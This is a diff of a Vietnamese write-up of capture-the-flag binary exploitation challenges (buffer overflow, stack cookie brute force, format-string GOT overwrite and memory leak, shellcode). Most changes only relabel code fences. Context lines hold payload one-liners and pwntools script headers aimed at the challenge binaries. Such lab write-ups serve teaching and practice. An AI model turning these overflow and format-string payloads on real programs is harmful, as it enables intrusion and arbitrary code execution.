@@ -11,7 +11,7 @@ mình dùng IDA 32 bit để reverse chương trình được:
 bài này gặp lỗi buffer over flow vì dùng hàm get() và nếu biến v5 bằng 6969 thì chúng ta có thực hiện hàm system() để có  thể lấy được flag
  và mình sẽ nhập vào đủ 10 của biến s rồi ghi đè lên biến v5 giá trị 0x1B39 (6969 ở hệ 10)
  
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -105,7 +105,7 @@ mình lên https://defuse.ca/online-x86-assembler.htm#disassembly2 để viết 
 ![image](https://hackmd.io/_uploads/By2Jg-jPT.png)
 
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -162,7 +162,7 @@ vị trí esp+10Ch
 Đã xuất ra màn hình 0x10 byte. Sử dụng "%89x" để xuất ra màn hình 0x59 byte nữa.
 Cuối cùng là tham số %n để đặt giá trị. Ta sử dụng ký tự $ để xác định chính xác tham số thứ mấy tương ứng với % đó.
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -218,7 +218,7 @@ dùng gdb và mình dừng ngay sau hàm snprintf được
 
 
 thấy rằng chuỗi mình nhập vào cách rsi 4(```%6$x```) nên để lấy được giá trị chúng ta nhập vào thì phải bắt đầu từ ```%10$x```
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -274,7 +274,7 @@ mình thấy vị trí %5$x cách vị trí mà chúng ta nhập vào  nhập v�
 
 ![image](https://hackmd.io/_uploads/ryI3TDqPa.png)
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -345,7 +345,7 @@ không cho đăng ký username tên là root nhưng lại bắt phải đăng nh
 
 Lỗi ở đây được xác định là do người lập trình sử dụng hàm strcmp không đúng cách. Thông tin về hàm strcmp như sau: Hàm này sẽ bắt đầu so sánh ký tự đầu tiên của 2 chuỗi, nếu như 2 ký tự đó là giống nhau thì so sánh ký tự tiếp theo, cho đến khi 2 ký tự ở 2 chuỗi khác nhau hoặc gặp ký tự NULL. Hàm sẽ trả ra bằng 0 khi cả 2 chuỗi giống nhau. Hàm sẽ trả ra khác 0 nếu 2 chuỗi không giống nhau. Phân tích về hàm strcmp phía trên. Sẽ có 2 trường hợp hàm strcmp trả ra giá trị là 0, một là 2 chuỗi truyền vào giống nhau, hai là một trong hai chuỗi chứa ký tự đầu tiên là ký tự null. Như vậy để có thể lấy được flag ta chỉ cần đăng ký một tên nào đó có ký tự đầu tiên là null. Sau đó đăng nhập bằng tên đó. Như vậy ta sẽ có quyền đọc file flag.
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -376,7 +376,7 @@ và mình nhận ra chương trình còn đơn giản hơn thế vì  khi đăng
 
 ![image](https://hackmd.io/_uploads/SJ3fM6Yw6.png)
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -417,7 +417,7 @@ mình nhập thử BBBB và thấy sẽ cần 16 byte để đến biến i ghi 
 
 ![image](https://hackmd.io/_uploads/HyXLrkgv6.png)
 vậy hãy giải quyết bài này thôi:
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -455,7 +455,7 @@ Biến cookie chỉ được khởi tạo ngẫu nhiên trong khoảng từ 0 ->
 
 ![image](https://hackmd.io/_uploads/S1ZaX7gwT.png)
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -481,7 +481,7 @@ p.interactive()
 ```
 
 hoặc 
-```
+```python=
  while true; do python -c 'print "A"*0x10 + "\x30\x00\x00\x00" + "A"*0xc + "\x7b\x85\x04\x08"' | ./bufferoverflow-homemade-cookie-v2 | grep "KMA"; done
  ```
 ![image](https://hackmd.io/_uploads/r1juJVlDT.png)
@@ -495,7 +495,7 @@ mình đọc file C được:
 
 bài này tương tự bài trước nhưng giá trị của biến i bây giờ không còn cố định và biết trước như ở bài trên  
 
-```
+```python=
  while true; do python -c 'print "A"*0x10 + "\x30\x00\x00\x00" + "A"*0xc + "\x7b\x85\x04\x08"' | ./bufferoverflow-homemade-cookie-v3 | grep "KMA"; done
  ```
 
@@ -513,7 +513,7 @@ mình đọc file C được:
 
 vậy chúng ta phải ghi đè 16 byte vào biến buff để đến chuỗi **echo Bye!** và ghi đè lên nó **/bin/sh** để lấy shell thực thi
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -535,7 +535,8 @@ p.interactive()
 và mình đã lấy được shell và đọc file:
 ![image](https://hackmd.io/_uploads/ryrXBHlva.png)
 hoặc các bạn có thể đọc flag luôn
-```
+
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -566,7 +567,7 @@ bài này chó mình nhập 20 byte vào biến buff trong khi chỉ khai báo 1
 Trong linux có một biến môi trường là PATH. Nếu biến PATH này chứa đường dẫn “/bin/” và trong “/bin/” có file thực thi tên “sh” thì dù đang ở bất cứ thư mục nào đều có thể thực thi file sh
 và mình chỉ ghi **sh** và vẫn nhận được shell vì đường dẫn file này đã có trong biến môi trường
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -603,7 +604,8 @@ trong trường hợp này 1 byte là đủ vì hàm cat_flag và hàm Bye gần
 mình dùng gdb để kiểm tra thấy đúng là 2 hàm này ngay cạnh nhau 
 ![image](https://hackmd.io/_uploads/Sy0zRSgD6.png)
 May mắn thay hàm Bye và cat_flag chỉ khác nhau byte cuối cùng chỉ cần tràn byte cuối cùng bằng giá trị 8b là chúng ta thay đổi luồng thực thi sang cat_flag
-```
+
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -643,14 +645,15 @@ Giá trị ô 0x804a018 chỉ khác vs địa chỉ hàm cat_flag 2 byte sau nh�
 ![image](https://hackmd.io/_uploads/SyGG-svDa.png)
 
 có thể thấy bắt đầu từ %x thứ tư ta có thể lấy được giá trị đã nhập vào
-```
+
+```python=
  python -c 'print "\x18\xa0\x04\x08" + "%33943x%4$hn"' | ./Formatstring-write-got-without-leak 
 ```
 
 ![image](https://hackmd.io/_uploads/SkLZJmPw6.png)
 
 hoặc:
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -701,7 +704,7 @@ thấy tại chuỗi %x thứ 4 sẽ gặp lại chuỗi chúng ta nhập vào
 ![image](https://hackmd.io/_uploads/ByOs4pvwT.png)
 
 
-```
+```python=
 #!/usr/bin/python3.7
 from pwn import *
 context.binary = exe = ELF('./Formatstring-write-command')
@@ -721,7 +724,7 @@ và stack lúc này
 ![image](https://hackmd.io/_uploads/SycjnTvDa.png)
 
 hoặc:
-```
+```python=
 #!/usr/bin/python3.7
 from pwn import *
 context.binary = exe = ELF('./Formatstring-write-command')
@@ -849,7 +852,7 @@ và nó chính là **0x804a060** và để lấy giá trị từ địa chỉ n�
 
 chúng ta thấy tại vị trí thứ 4 thì chúng ta có thể đọc lại giá trị mà ta nhập vào 
 
-```
+```python=
 #!/usr/bin/python3.7
 from pwn import *
 context.binary = exe = ELF('./Formatstring-leak-flag-in-mem-bss')
@@ -867,7 +870,7 @@ p.interactive()
 
 ![image](https://hackmd.io/_uploads/Sk5mvg_Da.png)
 hoặc:
-```
+```python=
  python -c 'print "\x60\xa0\x04\x08" + "%4$s"' | ./Formatstring-leak-flag-in-mem-bss
  ```
 
@@ -968,7 +971,7 @@ mình dùng https://defuse.ca/online-x86-assembler.htm#disassembly2 để viết
 ![image](https://hackmd.io/_uploads/BJF9NZova.png)
 
 
-```
+```python=
 section .text
 global _start
 _start:
@@ -987,7 +990,7 @@ _start:
 
 
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -1007,7 +1010,7 @@ p.interactive()
 
 
 ## Shellcode-2
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
@@ -1026,7 +1029,7 @@ p.interactive()
 
 ## Shellcode-5
 
-```
+```python=
 #!/usr/bin/python3.7
 
 from pwn import *
